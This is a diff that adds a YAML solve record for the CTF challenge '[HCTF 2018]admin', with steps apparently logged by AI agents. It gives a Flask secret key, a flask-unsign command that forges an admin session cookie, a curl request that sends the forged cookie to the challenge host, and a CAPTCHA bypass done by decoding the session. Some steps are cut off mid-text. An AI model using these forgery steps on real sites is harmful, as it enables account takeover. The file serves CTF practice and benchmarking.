@@ -1,0 +1,29 @@
+name: '[HCTF 2018]admin'
+category: web
+keywords:
+- hctf
+- admin
+steps:
+- '[claude] Flask secret key is b''ckj123'' (cracked via flask-unsign bruteforce)'
+- '[claude] Session forgery works and cookies are accepted by the server'
+- '[claude] DEADEND=Registering or logging in as ''admin'' user with common passwords'
+- '[codex] GET /change (after registering a normal account) leaks `<!-- https://github.com/woadsl1234/hctf_flask/
+  -->`; repo: `app/config.py` → `SECRET_KEY = os.environ.get(''SECRET_KEY'') or ''ckj123''`
+  (source cop'
+- '[codex] Target accepts the default key `ckj123`: `flask-unsign --sign --secret
+  ckj123 --cookie "{''name'':''admin'',''user_id'':''1'',''_fresh'':True,''_id'':{}}"`
+  yields a cookie the server accepts (HTTP 200, `<h1 class'
+- '[codex] Flag is returned for session name=admin: `curl -H "Cookie: session=<forged>"
+  http://184edd786a38d4d355ca8611.http-ctf2.dasctf.com/` → `<FLAG>` (raw body saved
+  at /h'
+- '[codex] CAPTCHA on /register is trivially bypassable: `/code` stores the answer
+  in the Flask session (`session[''image'']`), readable by decoding the cookie (zlib+base64)
+  before signing — PoC: /home/kali/worksp'
+- '[codex] FOUND_FLAG=<FLAG>'
+evidence_chain:
+- '[claude] Flask secret key is b''ckj123'' (cracked via flask-unsign bruteforce)'
+- '[claude] Session forgery works and cookies are accepted by the server'
+- '[codex] FOUND_FLAG=<FLAG>'
+success_format: CTF2\{[^}]+\}
+source: 5b792078-306a-4ec2-be2c-fa217375eb3d (solver 811cc76b-416f-4a03-b5fb-332029771d3c)
+notes: ''
